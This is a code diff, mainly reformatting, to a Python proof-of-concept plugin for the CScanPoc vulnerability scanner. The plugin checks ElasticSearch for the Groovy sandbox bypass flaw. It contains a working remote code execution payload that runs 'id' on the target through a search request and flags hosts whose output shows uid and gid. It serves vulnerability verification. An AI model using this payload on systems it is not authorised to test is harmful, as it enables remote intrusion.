@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import json
 
+
 class Vuln(ABVuln):
     vuln_id = 'ElasticSearch_0002'  # 平台漏洞编号，留空
     name = 'ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞'  # 漏洞名称
@@ -33,18 +34,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             data1 = '''{"name": "csancsan"}'''
-            r1 = requests.post('{target}/website/blog/'.format(target=self.target), data=data1)
+            r1 = requests.post(
+                '{target}/website/blog/'.format(target=self.target), data=data1)
 
             head = {
                 'User-Agent': 'Mozilla/5.0',
                 'Content-Type': 'application/json'
             }
-            payload = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
-            
-            r2 = requests.post('{target}/_search?pretty'.format(target=self.target), headers=head, data=json.dumps(payload))
-            #print(r2.text)
+            payload = {"size": 1, "script_fields": {"lupin": {
+                "lang": "groovy", "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
+
+            r2 = requests.post('{target}/_search?pretty'.format(
+                target=self.target), headers=head, data=json.dumps(payload))
+            # print(r2.text)
             if 'uid' in r2.text and 'gid' in r2.text and 'groups' in r2.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -54,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
